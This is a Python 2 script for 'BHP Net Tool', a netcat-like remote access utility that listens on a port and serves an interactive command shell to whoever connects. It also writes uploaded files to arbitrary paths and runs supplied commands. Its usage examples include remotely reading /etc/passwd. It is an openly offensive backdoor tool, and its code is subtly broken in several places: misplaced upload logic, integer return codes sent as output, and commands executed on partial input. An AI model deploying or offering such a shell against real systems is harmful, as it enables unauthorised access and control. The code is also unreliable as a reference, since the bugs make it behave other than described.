import sys
import socket
import getopt
import threading
import subprocess


# define some global variable
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def usage():
    print "BHP Net Tool"
    print ""
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l listen 					- listen on [host]:[port] for incoming connections"
    print "-e --execute=file_to_run - execute the given file upon receiving a connection"
    print "-c --command 				- initialize a command shell"
    print "-u --upload=destination 		- upon receiving connecting upload a file and write to [destination]"
    print ""
    print ""
    print "Examples"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=/Users/yanghui/Desktop/tcpclient.py"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # read command line option
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"

    def client_sender(buffer):
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            # connecting to destination host
            client.connect((target, port))

            if len(buffer):
                client.send(buffer)


            while True:
                recv_len = 1
                response = ""

                while recv_len:
                    data = client.recv(4096)
                    recv_len = len(data)
                    response += data

                    if  recv_len < 4096:
                        break


                print response

                # waiting for more input
                buffer = raw_input("")
                buffer += "\n"


                # send out
                client.send(buffer)


        except:
            print "[*] Exception! Exiting."

        client.close()

    def client_handler(client_socket):
        global upload
        global execute
        global command

        # check upload file
        if len(upload_destination):

            # read all character and write target
            file_buffer = ""

            # continue read data until no matched data
            while True:
                data = client_socket.recv(1024)

                if not data:
                    break
                else:
                    file_buffer += data
        # now we recieved and print them out
        try:
            file_decriptor = open(upload_destination, "wb")
            file_decriptor.write(file_buffer)
            file_decriptor.close()

            # make sure whether file write out
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

        # check command execute
        if len(execute):
            # run command
            # output = run_command(execute)
            output = subprocess.call(execute)
            client_socket.send(output)

        # if need a shell command, so we ran into the next recyle
        if command:

            while True:
                # jump out a window
                client_socket.send("<BHP:#> ")

                # now we accept file until found enter key
                cmd_buffer = ""
                while "\n" not in cmd_buffer:
                    cmd_buffer += client_socket.recv(1024)
                    # return command output
                    # response = run_command(cmd_buffer)
                    response = subprocess.call(cmd_buffer)
                    # return response data
                    client_socket.send(response)

    def server_loop():
        global target

        # if not define target, we listen all port
        if not len(target):
            target = "0.0.0.0"

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((target, port))

        server.listen(5)

        while True:
            client_socket, addr = server.accept()

            # apart a new thread to process a new client
            client_thread = threading.Thread(target=client_handler, args=(client_socket,))
            client_thread.start()

    if not listen and len(target) and port > 0:
        buffer = sys.stdin.read()
        client_sender(buffer)

    if listen:
        server_loop()

main()
